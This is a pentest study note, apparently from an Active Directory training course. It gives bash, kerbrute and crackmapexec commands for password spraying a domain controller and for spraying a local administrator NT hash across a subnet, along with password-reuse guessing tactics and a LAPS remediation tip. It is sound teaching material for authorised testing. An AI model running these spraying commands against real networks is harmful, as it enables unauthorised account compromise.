# Internal Password Spraying - from Linux
## Internal Password Spraying from a Linux Host

```bash
# Using a Bash one-liner for the Attack
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <DC-IP> | grep Authority; done
  # find : Account Name: tjohnson, Authority Name: INLANEFREIGHT

# Using Kerbrute for the Attack
kerbrute passwordspray -d inlanefreight.local --dc <DC-IP> valid_users.txt  Welcome1

# Using CrackMapExec & Filtering Logon Failures
sudo crackmapexec smb <DC-IP> -u valid_users.txt -p Password123 --continue-on-success | grep +
```

## Local Administrator Password Reuse


- If you obtain **administrative** access and the **NTLM password hash or cleartext password** for the local administrator account (**or another privileged local account**), this can be **attempted across multiple hosts in the network.** 
- If we find a **desktop host** (workstation host) with the **local administrator account** password set to something unique such as `$desktop%@admin123`, it might be worth attempting `$server%@admin123` against servers. 
- if we find **non-standard local administrator accounts** such as `bsmith`, we may find that the **password is reused** for a **similarly named domain user account**
-  If we retrieve the password for a **domain user** `ajones`, it is worth trying the **same password** on their **domain admin account** (if the user has one), it cloud be like `ajones_adm`(**privileged domain user**)
- We may obtain valid credentials for a **user in domain A** that are valid for a user with the same or similar username in **domain B**
- It is worth targeting high-value hosts such as **SQL or Microsoft Exchange servers**, as they are more likely to have a highly privileged **user logged** in or have their **credentials persistent in memory**.




 if we retrieve the NTLM hash for the l**ocal administrator account** from the local SAM database. In these instances, we can **spray the NT hash across an entire subnet** (or multiple subnets) to hunt for **local administrator accounts with the same password set**.
```bash
#### Local Admin Spraying with CrackMapExec
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

>This technique, while effective, is quite noisy and is not a good choice for any assessments that require stealth.
>One way to remediate this issue is using the free Microsoft tool [Local Administrator Password Solution (LAPS)](https://www.microsoft.com/en-us/download/details.aspx?id=46899) to have Active Directory manage local administrator passwords and enforce a unique password on each host that rotates on a set interval.


